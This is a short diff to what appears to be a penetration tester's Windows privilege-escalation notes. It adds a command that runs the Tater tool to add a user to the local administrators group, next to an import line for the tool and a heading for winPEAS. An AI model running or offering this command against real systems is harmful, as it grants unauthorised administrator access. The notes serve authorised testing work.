@@ -5,6 +5,7 @@ cmd:
 
 Powershell
 - `Import-Module  C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
+- `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
 
 ### Winpeas.exe
 Local:
